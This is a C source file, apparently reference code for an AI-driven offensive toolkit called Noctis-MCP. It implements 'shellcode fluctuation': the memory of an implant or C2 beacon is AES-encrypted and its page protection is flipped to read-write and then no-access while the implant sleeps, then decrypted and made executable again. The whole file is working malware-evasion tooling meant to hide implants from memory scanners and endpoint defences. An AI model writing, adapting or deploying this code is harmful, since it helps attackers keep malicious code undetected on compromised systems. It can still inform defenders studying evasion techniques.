// Reference code for Noctis-MCP AI intelligence system
// ShellcodeFluctuation Implementation

#include "shellcode_fluctuation.h"
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

// AES-256 encryption using BCrypt (reusing Zilean implementation pattern)
BOOL Fluctuation_AES256_Encrypt(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, BYTE* pIV) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bResult = FALSE;

    // Validate data size is 16-byte aligned for AES
    if (szDataLen % 16 != 0 || szDataLen > ULONG_MAX) {
        return FALSE;
    }

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // CRITICAL FIX: Create IV copy - BCryptEncrypt modifies IV in CBC mode
    BYTE ivCopy[16];
    memcpy(ivCopy, pIV, 16);

    ULONG cbResult;
    status = BCryptEncrypt(hKey, pData, (ULONG)szDataLen, NULL,
        ivCopy, 16, pData, (ULONG)szDataLen, &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    bResult = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

// AES-256 decryption using BCrypt
BOOL Fluctuation_AES256_Decrypt(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, BYTE* pIV) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bResult = FALSE;

    // Validate data size is 16-byte aligned for AES
    if (szDataLen % 16 != 0 || szDataLen > ULONG_MAX) {
        return FALSE;
    }

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // CRITICAL FIX: Create IV copy - BCryptDecrypt modifies IV in CBC mode
    BYTE ivCopy[16];
    memcpy(ivCopy, pIV, 16);

    ULONG cbResult;
    status = BCryptDecrypt(hKey, pData, (ULONG)szDataLen, NULL,
        ivCopy, 16, pData, (ULONG)szDataLen, &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    bResult = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

// Generate new random key for cycle
BOOL _Fluctuation_RotateKey(PFLUCTUATION_CONTEXT pContext) {
    if (!pContext) return FALSE;

    BCRYPT_ALG_HANDLE hAlgRng = NULL;
    NTSTATUS status;

    // Generate random key
    status = BCryptOpenAlgorithmProvider(&hAlgRng, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    status = BCryptGenRandom(hAlgRng, pContext->bCurrentKey, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlgRng, 0);
        return FALSE;
    }

    // Generate random IV
    status = BCryptGenRandom(hAlgRng, pContext->bIV, 16, 0);
    BCryptCloseAlgorithmProvider(hAlgRng, 0);

    return BCRYPT_SUCCESS(status);
}

// Change memory protection state
BOOL _Fluctuation_SetProtection(PVOID pAddress, SIZE_T size, DWORD newProtect, DWORD* oldProtect) {
    return VirtualProtect(pAddress, size, newProtect, oldProtect);
}

// Encrypt memory with current key
BOOL _Fluctuation_EncryptMemory(PFLUCTUATION_CONTEXT pContext) {
    if (!pContext || !pContext->config.pMemoryBase) return FALSE;

    return Fluctuation_AES256_Encrypt(
        (BYTE*)pContext->config.pMemoryBase,
        pContext->config.szMemorySize,
        pContext->bCurrentKey,
        pContext->bIV
    );
}

// Decrypt memory with current key
BOOL _Fluctuation_DecryptMemory(PFLUCTUATION_CONTEXT pContext) {
    if (!pContext || !pContext->config.pMemoryBase) return FALSE;

    return Fluctuation_AES256_Decrypt(
        (BYTE*)pContext->config.pMemoryBase,
        pContext->config.szMemorySize,
        pContext->bCurrentKey,
        pContext->bIV
    );
}

// Initialize fluctuation context
BOOL Fluctuation_Initialize(
    PFLUCTUATION_CONTEXT pContext,
    PVOID pMemoryBase,
    SIZE_T szMemorySize,
    BOOL bUseNoAccess,
    BOOL bRotateKeys
) {
    if (!pContext || !pMemoryBase || szMemorySize == 0) return FALSE;

    ZeroMemory(pContext, sizeof(FLUCTUATION_CONTEXT));

    // Store configuration
    pContext->config.pMemoryBase = pMemoryBase;
    pContext->config.szMemorySize = szMemorySize;
    pContext->config.bUseNoAccess = bUseNoAccess;
    pContext->config.bRotateKeys = bRotateKeys;
    pContext->config.dwCycleCount = 0;
    pContext->currentState = MEM_STATE_EXECUTE;

    // Generate initial key
    if (!_Fluctuation_RotateKey(pContext)) {
        return FALSE;
    }

    // Allocate backup buffer
    pContext->pBackup = HeapAlloc(GetProcessHeap(), 0, szMemorySize);
    if (!pContext->pBackup) {
        return FALSE;
    }

    return TRUE;
}

// Hide memory during sleep (Fluctuation cycle)
BOOL Fluctuation_HideMemory(PFLUCTUATION_CONTEXT pContext) {
    if (!pContext || !pContext->config.pMemoryBase) return FALSE;

    DWORD dwOldProtect;

    // State 1: Change RX → RW for encryption
    pContext->currentState = MEM_STATE_ENCRYPT;
    if (!_Fluctuation_SetProtection(pContext->config.pMemoryBase,
        pContext->config.szMemorySize, PAGE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    // Backup memory before encryption
    memcpy(pContext->pBackup, pContext->config.pMemoryBase, pContext->config.szMemorySize);

    // Rotate key if enabled (per-cycle randomization)
    if (pContext->config.bRotateKeys) {
        if (!_Fluctuation_RotateKey(pContext)) {
            return FALSE;
        }
    }

    // Encrypt memory
    if (!_Fluctuation_EncryptMemory(pContext)) {
        return FALSE;
    }

    // State 2: Change RW → NoAccess (if enabled)
    if (pContext->config.bUseNoAccess) {
        pContext->currentState = MEM_STATE_HIDDEN;
        if (!_Fluctuation_SetProtection(pContext->config.pMemoryBase,
            pContext->config.szMemorySize, PAGE_NOACCESS, &dwOldProtect)) {
            return FALSE;
        }
    }

    pContext->config.dwCycleCount++;
    return TRUE;
}

// Restore memory for execution
BOOL Fluctuation_RestoreMemory(PFLUCTUATION_CONTEXT pContext) {
    if (!pContext || !pContext->config.pMemoryBase) return FALSE;

    DWORD dwOldProtect;

    // State 3: Change NoAccess → RW for decryption
    pContext->currentState = MEM_STATE_DECRYPT;
    if (!_Fluctuation_SetProtection(pContext->config.pMemoryBase,
        pContext->config.szMemorySize, PAGE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    // Decrypt memory
    if (!_Fluctuation_DecryptMemory(pContext)) {
        return FALSE;
    }

    // State 4: Change RW → RX for execution
    pContext->currentState = MEM_STATE_EXECUTE;
    if (!_Fluctuation_SetProtection(pContext->config.pMemoryBase,
        pContext->config.szMemorySize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        return FALSE;
    }

    return TRUE;
}

// Complete sleep cycle with fluctuation
BOOL Fluctuation_SleepCycle(PFLUCTUATION_CONTEXT pContext, DWORD dwMilliseconds) {
    if (!pContext) return FALSE;

    // Hide memory (encrypt + optionally set NoAccess)
    if (!Fluctuation_HideMemory(pContext)) {
        return FALSE;
    }

    // Sleep while memory is hidden
    Sleep(dwMilliseconds);

    // Restore memory (decrypt + set RX)
    if (!Fluctuation_RestoreMemory(pContext)) {
        return FALSE;
    }

    return TRUE;
}

// Cleanup fluctuation context
VOID Fluctuation_Cleanup(PFLUCTUATION_CONTEXT pContext) {
    if (!pContext) return;

    // Free backup buffer
    if (pContext->pBackup) {
        SecureZeroMemory(pContext->pBackup, pContext->config.szMemorySize);
        HeapFree(GetProcessHeap(), 0, pContext->pBackup);
        pContext->pBackup = NULL;
    }

    // Clear encryption keys
    SecureZeroMemory(pContext->bCurrentKey, sizeof(pContext->bCurrentKey));
    SecureZeroMemory(pContext->bIV, sizeof(pContext->bIV));

    // Zero context
    SecureZeroMemory(pContext, sizeof(FLUCTUATION_CONTEXT));
}

// Example: Integrate with Zilean for enhanced sleep
BOOL Fluctuation_EnhancedSleep(PVOID pBeaconBase, SIZE_T szBeaconSize, DWORD dwSleepMs) {
    FLUCTUATION_CONTEXT ctx;

    // Initialize with NoAccess and key rotation enabled
    if (!Fluctuation_Initialize(&ctx, pBeaconBase, szBeaconSize, TRUE, TRUE)) {
        return FALSE;
    }

    // Execute sleep cycle (hide → sleep → restore)
    BOOL bResult = Fluctuation_SleepCycle(&ctx, dwSleepMs);

    // Cleanup
    Fluctuation_Cleanup(&ctx);

    return bResult;
}
